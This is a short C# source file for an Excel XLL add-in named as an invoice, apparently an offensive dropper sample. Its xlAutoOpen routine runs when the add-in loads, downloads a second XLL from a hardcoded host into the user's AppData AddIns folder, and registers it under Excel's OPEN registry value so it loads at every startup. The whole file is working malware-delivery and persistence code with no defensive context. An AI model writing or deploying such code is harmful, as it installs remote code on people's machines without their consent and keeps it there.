using System;
using System.Net;
using Microsoft.Win32;

namespace DetailedInvoiceXll
{
    class Program
    {
        [DllExport]
        static void xlAutoOpen()
        {
            
            string droplocation = Environment.GetEnvironmentVariable("appdata") + @"\Microsoft\AddIns\HelloFromXll.xll";
            WebClient client = new WebClient();
            client.DownloadFile("http://192.168.0.166/HelloFromXll.xll", droplocation);
            RegistryKey registryKey64 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(@"SOFTWARE\Microsoft\Office\16.0\Excel\Options", true);
            registryKey64.SetValue("OPEN", droplocation);

        }
        static void Main(string[] args)
        {
          
        }
    }
}
